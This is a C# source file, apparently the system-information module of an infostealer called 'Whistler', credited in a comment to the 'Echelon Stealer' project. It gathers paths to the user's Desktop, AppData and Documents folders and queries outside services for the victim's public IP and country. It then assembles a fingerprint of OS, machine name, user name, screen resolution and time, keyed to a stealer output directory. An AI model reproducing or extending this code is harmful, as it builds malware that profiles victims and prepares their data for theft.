using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using System.Xml;

namespace Whistler.Classes
{
    class classSysInfo//Credits : Echelon Stealer Git
    {
        public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); // Help.DesktopPath
        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); //  Help.LocalData
        public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System); // Help.System
        public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); // Help.AppDate
        public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData); // Help.CommonData
        public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); // Help.MyDocuments
        public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile); // Help.UserProfile
        public static string IP = "";
        public static string GeoIpURL = "http://ip-api.com/xml";
        public static string Country()
        {
            XmlDocument xml = new XmlDocument();
            HttpWebRequest.DefaultWebProxy = new WebProxy();
            xml.LoadXml(new WebClient().DownloadString(GeoIpURL));
            string countryCode = "[" + xml.GetElementsByTagName("country")[0].InnerText + "]";
            string Country = countryCode;
            return Country;
        }
        public static void getIP()
        {
            string ipaddy = "";
            HttpWebRequest.DefaultWebProxy = new WebProxy();
            ipaddy = new WebClient().DownloadString("https://api.ipify.org/");
            IP = ipaddy;
        }
        public static string PcInfo(string Echelon_Dir)
        {

            ComputerInfo pc = new ComputerInfo();
            Size resolution = Screen.PrimaryScreen.Bounds.Size;
            string sysinfo = "";
            getIP();
            try
            {
                 sysinfo = "OC verison - " + Environment.OSVersion + " | " + pc.OSFullName +
                        "\n" + "MachineName - " + Environment.MachineName + "/" + Environment.UserName +
                        "\n" + "Resolution - " + resolution +
                        "\n" + "Current time Utc - " + DateTime.UtcNow +
                        "\n" + "Current time - " + DateTime.Now +
                       
                        "\n" +
                        "\n" +
                        "\n" + "IP Geolocation: " + IP + " " + Country();
            }
            catch
            {

            }
            return sysinfo;
        }
    }
}
